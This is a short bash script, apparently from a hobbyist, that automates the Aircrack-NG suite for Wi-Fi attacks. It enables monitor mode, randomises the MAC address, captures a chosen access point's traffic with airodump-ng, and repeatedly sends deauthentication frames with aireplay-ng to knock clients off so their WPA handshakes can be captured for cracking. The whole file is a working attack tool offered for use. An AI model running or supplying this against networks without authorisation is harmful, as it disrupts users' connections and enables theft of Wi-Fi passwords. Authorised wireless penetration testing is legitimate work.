#!/bin/bash
######################################################
#  	                                             #
#  For wireless penetration testing sometimes speed  # 
#  is key.  This script makes the Aircrack-NG suite  #
#  run a bit  more efficiently.  Happy cracking !!!  #
#						     #
#  If this is useful I may add more features, such   #
#  as checking for the  4-way handshake, export to   #
#  hccapx for hashcat. For the time  being I just    #
#  feed the results into Wireshark to check for the  #
#  handshake, and a diff tool for hccapx conversion  # 
#						     #
#  Run with `./aircrack.sh` *NOT* `sh aircrack.sh`   #
# 						     #	
######################################################

if ! [ $(id -u) = 0 ]; then
   echo "Run as root"
   exit 1
fi

if [ $# -eq 0 ]
then
        echo "No arguments supplied"
else
        echo "Why did you supply arguments?"
	echo "None are implemented yet."
fi
clear

echo "Available Network Interfaces:"
echo "============================="
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'

echo 
echo "Cleaning up old monitor devices"
echo "==============================="
for i in $(seq 0 10); do iw dev mon$i del 2>/dev/null ; done

echo 
read -e -p "Which interface: " -i "wlan1" INTERFACE

airmon-ng start $INTERFACE

echo
echo "Available Network Interfaces:"
echo "============================="
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'

echo
read -e -p "Which interface: " -i "mon0" INTERFACE

echo
echo "Changing MAC address of monitor"
echo "================================"
ifconfig $INTERFACE down
macchanger -r $INTERFACE
ifconfig $INTERFACE up
xterm -geometry 90x53+850+0 -e "airodump-ng $INTERFACE" 2> /dev/null &

echo
echo "Output may be paused the the <SPACEBAR>"
read -e -p "Which BSSID: " BSSID 
read -e -p "Which channel: " CHANNEL 
read -e -p "Which name: " NAME
kill -9 $! 2> /dev/null

xterm -geometry 90x53+850+0 -e "airodump-ng --bssid $BSSID --channel $CHANNEL --write $NAME  mon0" 2> /dev/null &

while [ 1 ]
do
	read -e -p "Enter client MAC address (blank to broadcast) or \"q\" to quit: " -i "$CLIENT_MAC" CLIENT_MAC
	if [ "$CLIENT_MAC" = "q" ]
	then	
		# I have no idea why this is not executing when  
		# I put it in an ELIF in the following if loop.
		# Feel free to fix it and tell me why. 
		kill -9 $! 2> /dev/null
		exit 0	
	fi
	if [ -n "$CLIENT_MAC" ]
	then
		xterm -geometry 90x6+850+620 -e "aireplay-ng --ignore-negative-one -0 3 -a $BSSID -c $CLIENT_MAC $INTERFACE" 2> /dev/null
	else
		xterm -geometry 90x6+850+620 -e "aireplay-ng --ignore-negative-one -0 3 -a $BSSID $INTERFACE" 2> /dev/null
	fi
done
